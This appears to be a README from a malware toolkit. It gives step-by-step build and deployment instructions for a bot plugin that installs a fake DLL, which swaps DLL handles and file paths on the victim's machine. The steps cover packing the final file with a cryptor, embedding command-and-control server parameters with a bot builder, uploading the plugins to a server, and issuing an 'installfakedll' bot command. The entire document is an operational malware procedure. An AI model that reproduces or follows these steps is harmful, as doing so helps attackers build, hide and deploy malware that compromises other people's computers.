Build folder structure:

- Tools - packaging utilities
  - WhiteJoeBuild.exe - used to embed strings into DLLs and DLLs into EXEs
  - mystic.exe - cryptor for the final file ring3 version  
  
- SrcDir - Source files folder. 
  Has to include:
  - fake.dll - x86 DDL file. It replaces any DLL handle in the stack and the file path with its own.
  - FakeDllInstaller.dll - x86 DLL file - fake.dll installer source code.
    In the current version, it has to be built with BotBuilder.exe utility to allow embedding server connection parameters for downloading bot.plug file
  
- OutDir - Output folder. The folder is cleared when a new build is initiated.
  build results are stored here:
  - FakeInstaller.plug - final installation file
    
RunBuildFakeInstallerPlugDll.bat - batch file to start the build process.

How to make a new build:
- if you have a new version of fake.dll file - place it into SrcDir folder
  and rename it according to the naming convention for this folder(see above).
  
- How to get FakeInstaller.plug file

  - build FakeDllInstaller.dll file using BotBuilder.exe utility. You need to embed server connection parameters for downloading bot.plug file
  - place it into SrcDir folder and rename it according to the naming convention for this folder(see above).
  - run RunBuildFakeInstallerPlugDll.bat file and collect OutDir\FakeInstaller.plug file when finished. 
  
- How to get FakeBot.plug file

  build bot.plug file using BotBuilder.exe utility. 
  You need to embed server connection parameters - where the commands will be received from, etc.,
   
- upload FakeInstaller.plug file onto the server(You can use any names. Preferably, use a unique name, so there is no filename conflict with other installers.)
  
- upload FakeBot.plug file onto the server(You can use any names. Preferably, use a unique name, so there is no filename conflict with other installers.)

- start the bot that supports this command and issue it
  installfakedll <InstallerName.plug> <BuildedBotPlugName.plug>
